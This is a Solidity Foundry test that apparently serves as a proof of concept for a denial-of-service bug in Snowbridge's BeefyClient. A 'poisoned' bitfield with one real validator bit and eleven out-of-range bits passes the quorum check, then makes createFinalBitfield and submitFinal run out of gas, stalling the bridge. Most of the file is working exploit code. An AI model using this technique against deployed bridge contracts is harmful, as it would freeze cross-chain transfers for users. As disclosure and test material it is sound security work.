pragma solidity 0.8.28;

import "forge-std/Test.sol";

import {BeefyClient} from "src/BeefyClient.sol";
import {ScaleCodec} from "src/ScaleCodec.sol";
contract PoisonedBitfieldTest is Test {
    BeefyClient client;

    uint256 constant VSET_LEN = 16;         // 16 validators
    uint128 constant VSET_ID  = 1;          // current set id
    uint128 constant NEXT_ID  = 2;          // next set id (constructor requires NEXT_ID == VSET_ID + 1)

    // snowbridge constructor params (tune for fast tests)
    uint256 constant RANDAO_COMMIT_DELAY      = 1;    // blocks to wait after submitInitial
    uint256 constant RANDAO_COMMIT_EXPIRATION = 100;  // generous window
    uint256 constant MIN_NUM_REQUIRED_SIGS    = 2;    // small min; computeNumRequiredSignatures clamps at quorum

    // attacker/colluding validator (index 0)
    uint256 attackerSk;
    address attackerValidator;
    address[] validators;
    bytes32[] proofForIndex0;
    bytes32 validatorRoot;

    // commitment used for the session
    BeefyClient.Commitment commitment;
    bytes32 commitmentHash;

    function setUp() public {
        // --- 1) build a real validator set (16 addrs), with index 0 controlled by us ---
        attackerSk = uint256(keccak256("attacker-validator-sk"));
        attackerValidator = vm.addr(attackerSk);
        validators = new address[](VSET_LEN);
        validators[0] = attackerValidator;
        for (uint256 i = 1; i < VSET_LEN; i++) {
            // deterministically derive pseudo validators (no private keys needed for them)
            validators[i] = address(uint160(uint256(keccak256(abi.encodePacked("v", i)))));
        }

        // build a binary Merkle tree root (keccak(leaves)), power-of-two width => simple pairing
        (validatorRoot, proofForIndex0) = _buildRootAndProof(validators, 0);

        BeefyClient.ValidatorSet memory initialSet = BeefyClient.ValidatorSet({
            id: VSET_ID,
            length: uint128(VSET_LEN),
            root: validatorRoot
        });

        // next set is irrelevant for the exploit; just respect the constructor relation
        BeefyClient.ValidatorSet memory nextSet = BeefyClient.ValidatorSet({
            id: NEXT_ID,
            length: uint128(VSET_LEN),
            root: validatorRoot
        });

        client = new BeefyClient(
            RANDAO_COMMIT_DELAY,
            RANDAO_COMMIT_EXPIRATION,
            MIN_NUM_REQUIRED_SIGS,
            /* _initialBeefyBlock */ 0,
            initialSet,
            nextSet
        );

        // --- 3) build a real Commitment and its hash (as BeefyClient does) ---
        // ill keep payload empty so the hash equals: compact(0) || LE(blockNumber) || LE(validatorSetID)
        commitment.blockNumber = uint32(10);        // > latestBeefyBlock(0)
        commitment.validatorSetID = uint64(VSET_ID); // refer to current set
        commitment.payload = new BeefyClient.PayloadItem[](1);
        commitment.payload[0].payloadID = client.MMR_ROOT_ID();
        commitment.payload[0].data = abi.encodePacked(
            bytes32(0xdeadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeef)
        ); // dummy 32 bytes
        bytes memory enc = _encodeCommitment(commitment);
        commitmentHash = keccak256(enc);
    }

    function test_DoS_on_createFinalBitfield() public {
        // --- 4) prepare a "poisoned" bitfield: 1 real in-range bit + many phantom out-of-range bits ---
        // quorum for 16 is 11. We'll set 12 bits total:
        //  - index 0    (real, in-range, colluding validator)
        //  - indices 16..26 (phantom, OUTSIDE [0, VSET_LEN), but still inside the allocated 256-bit word)
        uint256[] memory bitsToSet = new uint256[](12);
        bitsToSet[0] = 0;
        for (uint256 j = 1; j < bitsToSet.length; j++) {
            bitsToSet[j] = 16 + (j - 1); // 16..26
        }
        uint256[] memory poisonedBitfield = client.createInitialBitfield(bitsToSet, VSET_LEN); // only checks length < bitsToSet.length

        // --- 5) provide ONE valid signature + merkle proof for index 0 to pass submitInitial ---
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(attackerSk, commitmentHash);
        BeefyClient.ValidatorProof memory proof;
        proof.v = v;
        proof.r = r;
        proof.s = s;
        proof.index = 0;
        proof.account = attackerValidator;
        proof.proof = proofForIndex0;

        // submitInitial succeeds:
        client.submitInitial(commitment, poisonedBitfield, proof);

        // --- 6) satisfy randao delay and commit prevrandao ---
        vm.roll(block.number + RANDAO_COMMIT_DELAY + 1); // wait enough blocks
        vm.prevrandao(bytes32(uint256(0xA11CE))); // set non-zero PREVRANDAO
        client.commitPrevRandao(commitmentHash);

        // --- 7) gas-limited low-level call to createFinalBitfield -> OOG due to unbounded subsampling ---
        bytes memory data = abi.encodeWithSelector(
            client.createFinalBitfield.selector, commitmentHash, poisonedBitfield
        );

        // cap the gas to make the OOG immediate (keeps the test fast)
        (bool ok, bytes memory ret) = address(client).call{gas: 90_000}(data);

        // expect the call to FAIL (return false) because subsample never finds 'n' distinct in-range bits
        assertFalse(ok, "Expected OOG revert in createFinalBitfield due to unbounded subsampling");
        assertEq(client.latestBeefyBlock(), 0, "Bridge should not progress (liveness DoS observed)");

        // optional: also show the ticket still exists (stuck session)
        // MUST mirror BeefyClient.createTicketID layout (32B addr + 32B hash)
        bytes32 ticketID = keccak256(abi.encode(address(this), commitmentHash));
        (
            uint64 tBlock,
            uint32 vlen,
            uint32 nReq,
            uint256 prevRandao,
            bytes32 bfHash
        ) = client.tickets(ticketID);
        assertTrue(tBlock != 0, "Ticket should still be present");
        assertEq(vlen, uint32(VSET_LEN), "Ticket validator set length recorded");
        assertGt(nReq, 1, "numRequiredSignatures should have been > number of in-range bits");
        assertEq(prevRandao, uint256(0xA11CE), "Seed committed");
        assertEq(bfHash, keccak256(abi.encodePacked(poisonedBitfield)), "Bitfield hash matches");

        // in-range count (indexes < VSET_LEN) is exactly 1 (only index 0)
        uint256 inRange = 0;
        uint256[] memory bf = poisonedBitfield;
        for (uint256 k = 0; k < VSET_LEN; k++) {
            uint256 element = k >> 8;           // always 0 in this test
            uint8 bit = uint8(k);
            if ((bf[element] >> bit) & 1 == 1) inRange++;
        }
        assertEq(inRange, 1, "Only 1 in-range bit set");

        // numRequiredSignatures > in-range bits → impossible to satisfy → OOG
        assertGt(nReq, inRange, "nReq must exceed in-range set bits");

        // total set bits >= quorum (11) because we set 12 bits total (1 in-range, 11 out-of-range)
        uint256 totalSet = 0;
        uint256 word = bf[0];
        while (word != 0) { totalSet += (word & 1); word >>= 1; }
        assertGe(totalSet, 11, "Poisoned bitfield passes quorum despite out-of-range bits");
    }

    function test_DoS_on_submitFinal() public {
        // re-run setup quickly (submitInitial + randao) with the same commitment:
        // poisoned bitfield again
        uint256[] memory bitsToSet = new uint256[](12);
        bitsToSet[0] = 0;
        for (uint256 j = 1; j < bitsToSet.length; j++) {
            bitsToSet[j] = 16 + (j - 1);
        }
        uint256[] memory poisonedBitfield = client.createInitialBitfield(bitsToSet, VSET_LEN);

        (uint8 v, bytes32 r, bytes32 s) = vm.sign(attackerSk, commitmentHash);
        BeefyClient.ValidatorProof memory proof0;
        proof0.v = v;
        proof0.r = r;
        proof0.s = s;
        proof0.index = 0;
        proof0.account = attackerValidator;
        proof0.proof = proofForIndex0;

        client.submitInitial(commitment, poisonedBitfield, proof0);
        vm.roll(block.number + RANDAO_COMMIT_DELAY + 1);
        vm.prevrandao(bytes32(uint256(0xA11CE))); // Set non-zero PREVRANDAO
        client.commitPrevRandao(commitmentHash);

        // fetch the ticket to know how many proofs submitFinal expects
        // MUST mirror BeefyClient.createTicketID layout (32B addr + 32B hash)
        bytes32 ticketID = keccak256(abi.encode(address(this), commitmentHash));
        (, , uint32 numReq, , ) = client.tickets(ticketID);

        // prepare a proofs array of the right length; only the first one is our real proof.
        BeefyClient.ValidatorProof[] memory proofs = new BeefyClient.ValidatorProof[](numReq);
        proofs[0] = proof0;
        // others can be zero-filled; verifyCommitment will never reach them because subsample OOGs first

        // dummy MMR leaf data; verifyCommitment runs before MMR checks, so this won't be reached
        BeefyClient.MMRLeaf memory leaf;
        bytes32[] memory leafProof = new bytes32[](0);
        uint256 leafProofOrder = 0;

        bytes memory data = abi.encodeWithSelector(
            client.submitFinal.selector,
            commitment,
            poisonedBitfield,
            proofs,
            leaf,
            leafProof,
            leafProofOrder
        );

        // cap the gas to make the OOG immediate (keeps the test fast)
        (bool ok, ) = address(client).call{gas: 90_000}(data);
        assertFalse(ok, "Expected OOG revert in submitFinal due to unbounded subsampling");
        assertEq(client.latestBeefyBlock(), 0, "Bridge should still be stuck (no progress)");
    }

    /* ---------------------------------- Helpers ---------------------------------- */

    // Encodes the commitment exactly as BeefyClient.encodeCommitment:
    // bytes.concat( encodeCommitmentPayload(items),
    //               ScaleCodec.encodeU32(blockNumber),
    //               ScaleCodec.encodeU64(validatorSetID) )
    // Here items.length == 0.
    function _encodeCommitment(BeefyClient.Commitment memory c)
        internal
        pure
        returns (bytes memory)
    {
        bytes memory payload = ScaleCodec.checkedEncodeCompactU32(c.payload.length);
        for (uint256 i = 0; i < c.payload.length; i++) {
            payload = bytes.concat(
                payload,
                c.payload[i].payloadID,
                ScaleCodec.checkedEncodeCompactU32(c.payload[i].data.length),
                c.payload[i].data
            );
        }
        return bytes.concat(
            payload,
            ScaleCodec.encodeU32(c.blockNumber),
            ScaleCodec.encodeU64(c.validatorSetID)
        );
    }

    // build binary merkle tree (power-of-two width) over keccak(address), and the proof for 'target'
    function _buildRootAndProof(address[] memory addrs, uint256 target)
        internal
        pure
        returns (bytes32 root, bytes32[] memory proof)
    {
        require(addrs.length > 0, "no addrs");
        require(_isPowerOfTwo(addrs.length), "width must be power-of-two for this helper");

        // leaves = keccak256(abi.encodePacked(address))
        bytes32[] memory level = new bytes32[](addrs.length);
        for (uint256 i = 0; i < addrs.length; i++) {
            level[i] = keccak256(abi.encodePacked(addrs[i]));
        }

        uint256 n = addrs.length;
        uint256 idx = target;
        proof = new bytes32[](_log2(addrs.length));
        uint256 p = 0;

        while (n > 1) {
            bytes32[] memory next = new bytes32[](n / 2);
            for (uint256 i = 0; i < n; i += 2) {
                bytes32 left = level[i];
                bytes32 right = level[i + 1];
                next[i / 2] = keccak256(abi.encodePacked(left, right));
                if (i == idx || i + 1 == idx) {
                    // capture sibling in the order SubstrateMerkleProof.verify expects:
                    // if current idx is even (left), sibling is right; else sibling is left
                    proof[p++] = (idx % 2 == 0) ? right : left;
                }
            }
            level = next;
            n = next.length;
            idx = idx / 2;
        }
        root = level[0];
    }

    function _log2(uint256 x) internal pure returns (uint256 y) {
        require(x > 0, "log2(0)");
        while (x > 1) {
            x >>= 1;
            y++;
        }
    }

    function _isPowerOfTwo(uint256 x) internal pure returns (bool) {
        return x != 0 && (x & (x - 1)) == 0;
    }
}
